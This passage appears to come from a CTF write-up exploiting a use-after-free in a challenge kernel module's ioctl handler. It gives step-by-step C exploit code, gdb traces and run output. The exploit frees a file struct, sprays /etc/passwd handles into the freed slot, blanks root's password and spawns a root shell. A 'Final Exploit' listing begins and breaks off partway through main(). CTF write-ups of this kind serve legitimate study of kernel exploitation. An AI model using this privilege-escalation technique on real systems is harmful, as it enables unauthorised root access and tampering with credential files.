+<p>To develop a cleaner exploit, we can use the following helper functions:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#65737e;">// ioctl IOCTL_CTF_INSTALL_FILE wrapper.
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">install_file</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">device_fd</span><span>, </span><span style="color:#b48ead;">int </span><span>*</span><span style="color:#bf616a;">fd</span><span>) {
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">int</span><span> installed_fd = </span><span style="color:#bf616a;">ioctl</span><span>(device_fd, IOCTL_CTF_INSTALL_FILE, fd);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(installed_fd &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">warn</span><span>(&quot;</span><span style="color:#a3be8c;">[!] IOCTL_CTF_INSTALL_FILE failed</span><span>&quot;);
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">return</span><span> installed_fd;
+</span><span>}
+</span><span>
+</span><span style="color:#65737e;">// ioctl IOCTL_CTF_CLOSE_FILE wrapper.
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">close_file</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">device_fd</span><span>, </span><span style="color:#b48ead;">int </span><span>*</span><span style="color:#bf616a;">fd</span><span>) {
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">int</span><span> res = </span><span style="color:#bf616a;">ioctl</span><span>(device_fd, IOCTL_CTF_CLOSE_FILE, fd);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(res &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] IOCTL_CTF_INSTALL_FILE failed</span><span>&quot;);
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">return</span><span>;
+</span><span>}
+</span><span>
+</span><span style="color:#65737e;">// Limits the available amount of open files handable by the current process.
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">set_fd_limit</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">cur</span><span>, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">max</span><span>) {
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> rlimit new, old;
+</span><span>	new.</span><span style="color:#bf616a;">rlim_cur </span><span>= cur;
+</span><span>	new.</span><span style="color:#bf616a;">rlim_max </span><span>= max;
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">int</span><span> res = </span><span style="color:#bf616a;">prlimit</span><span>(</span><span style="color:#bf616a;">getpid</span><span>(), RLIMIT_NOFILE, &amp;new, &amp;old);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(res &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] prlimit failed</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">[+] RLIMIT_NOFILE set to:</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+]</span><span style="color:#96b5b4;">\t</span><span style="color:#a3be8c;">rlim_cur = </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+]</span><span style="color:#96b5b4;">\t</span><span style="color:#a3be8c;">rlim_max = </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span>&quot;, cur, max);
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">return</span><span>;
+</span><span>}
+</span></code></pre>
+<h3 id="create-a-temporary-file">Create a temporary file</h3>
+<p>Once we have created these helper functions, we can start with the actual exploit.
+Firstly, we need to open the LKM and a temporary file that will be the one used to trigger the UAF. This can be achieved the following way:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>	</span><span style="color:#65737e;">// Opening LKM.
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Opening LKM</span><span>&quot;);
+</span><span>	device_fd = </span><span style="color:#bf616a;">open</span><span>(DEVICE_FILE, O_RDONLY);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(device_fd &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to open device file</span><span>&quot;);
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Opening tmp file.
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Opening tmp file</span><span>&quot;);
+</span><span>	fd0 = </span><span style="color:#bf616a;">open</span><span>(TMP_FILE, O_CREAT | O_RDWR, </span><span style="color:#d08770;">0666</span><span>);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(fd0 &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to open </span><span style="color:#d08770;">%s</span><span>&quot;, TMP_FILE);
+</span><span>	}
+</span></code></pre>
+<h3 id="map-the-temporary-file">Map the temporary file</h3>
+<p>The next step is to map the previously opened temporary file into memory. This way we can get access to the file with a single pointer instead of going through a file descriptor. This mapping must allow read and write access and must have the <code>MAP_SHARED</code> flag set. This way any change in the mapped file will be carried through to the underlying file.</p>
+<p>We must take into account that if we want to access an empty mapped file, we will receive a <code>bus error</code> as we will be accessing beyond the file's end. To avoid this later on, we can write a placeholder to the file.</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>	</span><span style="color:#65737e;">// Allocating some bytes into tmp file to prevent bus error.
+</span><span>	</span><span style="color:#65737e;">// fallocate or ftruncate are other viable options.
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Allocating some bytes into tmp file to prevent bus error</span><span>&quot;);
+</span><span>	</span><span style="color:#bf616a;">write</span><span>(fd0, placeholder, </span><span style="color:#96b5b4;">strlen</span><span>(placeholder));
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// Mapping tmp file into memory.
+</span><span>	</span><span style="color:#65737e;">// Size 1 allocates minimum size which is an entire page.
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Mapping tmp file into memory</span><span>&quot;);
+</span><span>	ptr = </span><span style="color:#bf616a;">mmap</span><span>(</span><span style="color:#d08770;">NULL</span><span>, </span><span style="color:#d08770;">1</span><span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd0, </span><span style="color:#d08770;">0</span><span>);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(ptr == MAP_FAILED) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to map </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> into memory</span><span>&quot;, TMP_FILE);
+</span><span>	}
+</span></code></pre>
+<h3 id="drop-f-count-to-0">Drop <code>f_count</code> to <code>0</code></h3>
+<p>Now the <code>f_count</code> related to our temporary file should have a value of <code>2</code> as the mapping has increased the previous value by one.</p>
+<p>Our next goal is to force <code>get_unused_fd_flags(0)</code> to fail. As we explained before, this can be achieved by limiting the max amount of open files a process can have. We will use the previously defined wrapper for the <code>prlimit</code> function.</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>	</span><span style="color:#65737e;">// Limiting the max amount of file descriptors.
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Limiting max amount of file descriptors</span><span>&quot;);
+</span><span>	</span><span style="color:#bf616a;">set_fd_limit</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">4096</span><span>);	
+</span></code></pre>
+<p>Here we are setting the soft limit at <code>0</code> and the hard limit at <code>4096</code>. This way any attempt to open a new file descriptor will fail.</p>
+<p>As we said before, the actual value of <code>f_count</code> is <code>2</code> so this means we need to call <code>install_file</code> two consecutive times to drop this value to <code>0</code>. This will release the <em>file</em> struct and the memory region will be freed.</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>	</span><span style="color:#65737e;">// Forcing file struct release through file-&gt;f_count-&gt;counter decrement. 
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Forcing file struct release. Expecting EBADF:</span><span>&quot;);
+</span><span>	fd1 = </span><span style="color:#bf616a;">install_file</span><span>(device_fd, &amp;fd0);
+</span><span>	fd1 = </span><span style="color:#bf616a;">install_file</span><span>(device_fd, &amp;fd0);
+</span></code></pre>
+<p>At this point, we can check what happens with the <code>f_count</code>. To be able to put a breakpoint at the <code>install_file</code> function of the LKM, we will need to load the LKM symbols into gdb.</p>
+<p>To load the LKM symbols, we need to find the address of the <code>.text</code> section of the LKM inside the emulator:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>/home/user # cat /sys/module/ctf/sections/.text
+</span><span>0xffffffffc0203000
+</span></code></pre>
+<p>Later, to load the symbols, we can do the following in gdb:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>pwndbg&gt; target remote :1234
+</span><span>...
+</span><span>pwndbg&gt; add-symbol-file initramfs/chall/ctf.ko 0xffffffffc0203000
+</span><span>add symbol table from file &quot;initramfs/chall/ctf.ko&quot; at
+</span><span>	.text_addr = 0xffffffffc0203000
+</span><span>Reading symbols from initramfs/chall/ctf.ko...
+</span><span>pwndbg&gt; b install_file
+</span><span>Breakpoint 1 at 0xffffffffc0203070: file /home/bepernapat/CTF/EuskalHack/initramfs/chall/ctf.c, line 14.
+</span></code></pre>
+<p>The first time we reach the breakpoint, if we execute the instructions one by one, we can see how <code>get_unused_fd_flags(0)</code> fails and we jump to the error management part. Here we can check how the <code>f_count</code> is decremented:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>─────[ SOURCE (CODE) ]───── 
+</span><span>   52 error:
+</span><span> ► 53         fput(file);
+</span><span>   54         return -EBADF;
+</span><span>   55 }
+</span><span>───────────────────────────
+</span><span>pwndbg&gt; p file-&gt;f_count
+</span><span>$1 = {
+</span><span>  counter = 2
+</span><span>}
+</span><span>pwndbg&gt; n
+</span><span>
+</span><span>─────[ SOURCE (CODE) ]───── 
+</span><span>   52 error:
+</span><span>   53         fput(file);
+</span><span> ► 54         return -EBADF;
+</span><span>   55 }
+</span><span>───────────────────────────
+</span><span>pwndbg&gt; p file-&gt;f_count
+</span><span>$2 = {
+</span><span>  counter = 1
+</span><span>}
+</span></code></pre>
+<p>The following time we hit the breakpoint, we can see how the <code>f_count</code> drops to <code>0</code> and the <em>file</em> struct is released/freed:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>─────[ SOURCE (CODE) ]───── 
+</span><span>   52 error:
+</span><span> ► 53         fput(file);
+</span><span>   54         return -EBADF;
+</span><span>   55 }
+</span><span>───────────────────────────
+</span><span>pwndbg&gt; p file-&gt;f_count
+</span><span>$3 = {
+</span><span>  counter = 1
+</span><span>}
+</span><span>pwndbg&gt; n
+</span><span>
+</span><span>─────[ SOURCE (CODE) ]───── 
+</span><span>   52 error:
+</span><span>   53         fput(file);
+</span><span> ► 54         return -EBADF;
+</span><span>   55 }
+</span><span>───────────────────────────
+</span><span>pwndbg&gt; p file-&gt;f_count
+</span><span>$4 = {
+</span><span>  counter = 0
+</span><span>}
+</span></code></pre>
+<h3 id="etc-passwd-spraying"><code>/etc/passwd</code> spraying</h3>
+<p>Now that the <em>file</em> struct has been released, we need to fill this freed space with a <em>file</em> struct pointing to a critical file. In this case, we spray with <em>file</em> structs pointing to <code>/etc/passwd</code>.</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>	</span><span style="color:#65737e;">// Spray to fill the previously freed file struct with a /etc/passwd file struct. 
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Spraying file structs pointing to /etc/passwd</span><span>&quot;);
+</span><span>	</span><span style="color:#b48ead;">for</span><span>(</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#d08770;">0</span><span>; i &lt; </span><span style="color:#d08770;">512</span><span>; i++) {
+</span><span>		fd_spray[i] = </span><span style="color:#bf616a;">open</span><span>(&quot;</span><span style="color:#a3be8c;">/etc/passwd</span><span>&quot;, O_RDONLY);
+</span><span>       		</span><span style="color:#b48ead;">if </span><span>(fd_spray[i] &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>                	</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to spray /etc/passwd</span><span>&quot;);
+</span><span>        	}
+</span><span>	}
+</span></code></pre>
+<p>By the time a <em>file</em> struct fills the previously freed space, we will be able to read and write <code>/etc/passwd</code> as these are the permissions we set when we first mapped the temporary file into memory.</p>
+<p>To check if the spraying has successfully finished, we can print the memory region we mapped at the beginning of the exploit. If the printed output is the content of <code>/etc/passwd</code>, the spraying has successfully finished. Otherwise, we'll see the content of the placeholder we set at the beginning.</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>	</span><span style="color:#65737e;">// Checking for successful UAF.
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Checking for successful UAF. Content should be from /etc/passwd:</span><span>&quot;);
+</span><span>	</span><span style="color:#bf616a;">fputs</span><span>(ptr, stdout);
+</span></code></pre>
+<h3 id="overwrite-etc-passwd">Overwrite <code>/etc/passwd</code></h3>
+<p>After the last check is completed, we can overwrite the first line of <code>/etc/passwd</code> with our custom value:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>	</span><span style="color:#65737e;">// Overwriting /etc/passwd root entry.
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Overwriting /etc/passwd root entry. Content should have been modified:</span><span>&quot;);
+</span><span>	</span><span style="color:#bf616a;">memcpy</span><span>(ptr, privesc, </span><span style="color:#96b5b4;">strlen</span><span>(privesc));
+</span><span>	</span><span style="color:#bf616a;">fputs</span><span>(ptr, stdout);
+</span></code></pre>
+<h3 id="avoid-kernel-memory-problems">Avoid kernel memory problems</h3>
+<p>At this moment, we have successfully completed the UAF exploitation by writing to an arbitrary file. However, during this process, we have messed up with the kernel memory, and this leads to kernel panic after running <code>su root</code> and some other commands.</p>
+<p>By the time a process ends, it decrements the <code>f_count</code> of all the file descriptors in its file descriptor table. As there are two file descriptors pointing to the same file struct, it could be creating a double free which ends in kernel panic. However, after fixing this, it keeps breaking for some other reason.</p>
+<p>After some time, we can find a good solution. It is not the cleanest way of solving the problem, but it definitely works. We can fork at the beginning of the exploit, wait until the corruption process ends, and finally run the <code>su root</code> command from the clean process so we don't have to mess with bad kernel memory:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Fork &amp; wait for success</span><span>&quot;);
+</span><span>	pid = </span><span style="color:#bf616a;">fork</span><span>();
+</span><span>	</span><span style="color:#b48ead;">if</span><span>(pid == -</span><span style="color:#d08770;">1</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] Failed to fork for a new process</span><span>&quot;);
+</span><span>	}
+</span><span>	</span><span style="color:#b48ead;">else if</span><span>(pid == </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		
+</span><span>		</span><span style="color:#65737e;">// Waiting for corruption completion.
+</span><span>		</span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">3</span><span>);
+</span><span>	
+</span><span>	 	</span><span style="color:#65737e;">// Changing user to root.
+</span><span>		</span><span style="color:#b48ead;">char </span><span>*argvx[</span><span style="color:#d08770;">3</span><span>] = { &quot;</span><span style="color:#a3be8c;">/bin/su</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">root</span><span>&quot;, </span><span style="color:#d08770;">NULL </span><span>};
+</span><span>		</span><span style="color:#bf616a;">execve</span><span>(&quot;</span><span style="color:#a3be8c;">/bin/su</span><span>&quot;, &amp;argvx, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>		
+</span><span>		</span><span style="color:#65737e;">// Should never be reached.
+</span><span>		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span>;
+</span><span>	}
+</span><span>	...
+</span><span>
+</span><span>		</span><span style="color:#65737e;">// Entering eternal loop.	
+</span><span>	</span><span style="color:#bf616a;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[+] Corruption process has been completed. Waiting for a root shell...</span><span>&quot;);
+</span><span>	</span><span style="color:#b48ead;">while</span><span>(</span><span style="color:#d08770;">1</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">10</span><span>);
+</span><span>	}
+</span></code></pre>
+<h3 id="have-fun">Have fun :)</h3>
+<p>Time to have fun! Now we can elevate our privileges to root and do whatever we want:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>/home/user $ id
+</span><span>uid=1000(user) gid=1000(user) groups=1000(user)
+</span><span>/home/user $ ./exploit
+</span><span>[+] Fork &amp; wait for success
+</span><span>[+] Opening LKM
+</span><span>[+] Opening tmp file
+</span><span>[+] Allocating some bytes into tmp file to prevent bus error
+</span><span>[+] Mapping tmp file into memory
+</span><span>[+] Limiting max amount of file descriptors
+</span><span>[+] RLIMIT_NOFILE set to:
+</span><span>[+]     rlim_cur = 0
+</span><span>[+]     rlim_max = 4096
+</span><span>[+] Forcing file struct release. Expecting EBADF:
+</span><span>exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+</span><span>exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+</span><span>[+] Extending max amount of file descriptors
+</span><span>[+] RLIMIT_NOFILE set to:
+</span><span>[+]     rlim_cur = 4096
+</span><span>[+]     rlim_max = 4096
+</span><span>[+] Spraying file structs pointing to /etc/passwd
+</span><span>[+] Checking for successful UAF. Content should be from /etc/passwd:
+</span><span>root:x:0:0:root:/root:/bin/sh
+</span><span>user:x:1000:1000:user:/home/user:/bin/sh
+</span><span>[+] Overwriting /etc/passwd root entry. Content should have been modified:
+</span><span>root::0:0:root:/root:/bin/ash
+</span><span>user:x:1000:1000:user:/home/user:/bin/sh
+</span><span>[+] Corruption process has been completed. Waiting for a root shell...
+</span><span>/home/user # id
+</span><span>uid=0(root) gid=0(root) groups=0(root)
+</span><span>/home/user # ls -l /flag
+</span><span>----------    1 root     root            27 Jun 22 11:03 /flag
+</span><span>/home/user # cat /flag
+</span><span>CTF{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
+</span></code></pre>
+<h2 id="final-exploit">Final Exploit</h2>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#65737e;">/* Tested on Linux 6.6.34
+</span><span style="color:#65737e;">
+</span><span style="color:#65737e;">/home/user $ id
+</span><span style="color:#65737e;">uid=1000(user) gid=1000(user) groups=1000(user)
+</span><span style="color:#65737e;">/home/user $ ./exploit
+</span><span style="color:#65737e;">[+] Fork &amp; wait for success
+</span><span style="color:#65737e;">[+] Opening LKM
+</span><span style="color:#65737e;">[+] Opening tmp file
+</span><span style="color:#65737e;">[+] Allocating some bytes into tmp file to prevent bus error
+</span><span style="color:#65737e;">[+] Mapping tmp file into memory
+</span><span style="color:#65737e;">[+] Limiting max amount of file descriptors
+</span><span style="color:#65737e;">[+] RLIMIT_NOFILE set to:
+</span><span style="color:#65737e;">[+]	rlim_cur = 0
+</span><span style="color:#65737e;">[+]	rlim_max = 4096
+</span><span style="color:#65737e;">[+] Forcing file struct release. Expecting EBADF:
+</span><span style="color:#65737e;">exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+</span><span style="color:#65737e;">exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+</span><span style="color:#65737e;">[+] Extending max amount of file descriptors
+</span><span style="color:#65737e;">[+] RLIMIT_NOFILE set to:
+</span><span style="color:#65737e;">[+]	rlim_cur = 4096
+</span><span style="color:#65737e;">[+]	rlim_max = 4096
+</span><span style="color:#65737e;">[+] Spraying file structs pointing to /etc/passwd
+</span><span style="color:#65737e;">[+] Checking for successful UAF. Content should be from /etc/passwd:
+</span><span style="color:#65737e;">root:x:0:0:root:/root:/bin/sh
+</span><span style="color:#65737e;">user:x:1000:1000:user:/home/user:/bin/sh
+</span><span style="color:#65737e;">[+] Overwriting /etc/passwd root entry. Content should have been modified:
+</span><span style="color:#65737e;">root::0:0:root:/root:/bin/ash
+</span><span style="color:#65737e;">user:x:1000:1000:user:/home/user:/bin/sh
+</span><span style="color:#65737e;">[+] Corruption process has been completed. Waiting for a root shell...
+</span><span style="color:#65737e;">/home/user # id
+</span><span style="color:#65737e;">uid=0(root) gid=0(root) groups=0(root)
+</span><span style="color:#65737e;">/home/user #
+</span><span style="color:#65737e;">
+</span><span style="color:#65737e;">*/
+</span><span>
+</span><span style="color:#b48ead;">#define </span><span>_GNU_SOURCE
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdint.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">unistd.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">errno.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">err.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">string.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">pthread.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">sys/time.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">sys/resource.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">string.h</span><span>&gt;
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">#define </span><span>IOCTL_CTF_INSTALL_FILE	</span><span style="color:#bf616a;">_IOWR</span><span>(&#39;</span><span style="color:#a3be8c;">s</span><span>&#39;, </span><span style="color:#d08770;">0x41</span><span>, </span><span style="color:#b48ead;">int</span><span>)
+</span><span style="color:#b48ead;">#define </span><span>IOCTL_CTF_CLOSE_FILE	</span><span style="color:#bf616a;">_IOWR</span><span>(&#39;</span><span style="color:#a3be8c;">s</span><span>&#39;, </span><span style="color:#d08770;">0x42</span><span>, </span><span style="color:#b48ead;">int</span><span>)
+</span><span style="color:#b48ead;">#define </span><span>DEVICE_FILE &quot;</span><span style="color:#a3be8c;">/dev/ctf</span><span>&quot;
+</span><span style="color:#b48ead;">#define </span><span>TMP_FILE &quot;</span><span style="color:#a3be8c;">/home/user/tmp</span><span>&quot;
+</span><span>
+</span><span style="color:#65737e;">// ioctl IOCTL_CTF_INSTALL_FILE wrapper.
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">install_file</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">device_fd</span><span>, </span><span style="color:#b48ead;">int </span><span>*</span><span style="color:#bf616a;">fd</span><span>) {
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">int</span><span> installed_fd = </span><span style="color:#bf616a;">ioctl</span><span>(device_fd, IOCTL_CTF_INSTALL_FILE, fd);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(installed_fd &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">warn</span><span>(&quot;</span><span style="color:#a3be8c;">[!] IOCTL_CTF_INSTALL_FILE failed</span><span>&quot;);
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">return</span><span> installed_fd;
+</span><span>}
+</span><span>
+</span><span style="color:#65737e;">// ioctl IOCTL_CTF_CLOSE_FILE wrapper.
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">close_file</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">device_fd</span><span>, </span><span style="color:#b48ead;">int </span><span>*</span><span style="color:#bf616a;">fd</span><span>) {
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">int</span><span> res = </span><span style="color:#bf616a;">ioctl</span><span>(device_fd, IOCTL_CTF_CLOSE_FILE, fd);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(res &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] IOCTL_CTF_INSTALL_FILE failed</span><span>&quot;);
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">return</span><span>;
+</span><span>}
+</span><span>
+</span><span style="color:#65737e;">// Limits the available amount of open files handable by the current process.
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">set_fd_limit</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">cur</span><span>, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">max</span><span>) {
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> rlimit new, old;
+</span><span>	new.</span><span style="color:#bf616a;">rlim_cur </span><span>= cur;
+</span><span>	new.</span><span style="color:#bf616a;">rlim_max </span><span>= max;
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">int</span><span> res = </span><span style="color:#bf616a;">prlimit</span><span>(</span><span style="color:#bf616a;">getpid</span><span>(), RLIMIT_NOFILE, &amp;new, &amp;old);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(res &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#bf616a;">err</span><span>(</span><span style="color:#d08770;">0</span><span>, &quot;</span><span style="color:#a3be8c;">[-] prlimit failed</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">[+] RLIMIT_NOFILE set to:</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+]</span><span style="color:#96b5b4;">\t</span><span style="color:#a3be8c;">rlim_cur = </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+]</span><span style="color:#96b5b4;">\t</span><span style="color:#a3be8c;">rlim_max = </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span>&quot;, cur, max);
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">return</span><span>;
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span>, </span><span style="color:#b48ead;">char </span><span>*</span><span style="color:#bf616a;">argv</span><span>[]) {
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">const char </span><span>*placeholder = &quot;</span><span style="color:#a3be8c;">Looks like it does not work properly D:</span><span style="color:#96b5b4;">\n</span><span>&quot;;
+</span><span>	</span><span style="color:#b48ead;">const char </span><span>*privesc = &quot;</span><span style="color:#a3be8c;">root::0:0:root:/root:/bin/ash</span><span>&quot;;
+</span><span>	</span><span style="color:#b48ead;">int</span><span> pid = -</span><span style="color:#d08770;">1</span><span>;
+</span><span>	</span><span style="color:#b48ead;">int</span><span> fd0, fd1, device_fd;
+</span><span>	</span><span style="color:#b48ead;">int</span><span> fd_spray[</span><span style="color:#d08770;">512</span><span>];
+</span><span>	</span><span style="color:#b48ead;">void </span><span>*ptr;
+</span><span>
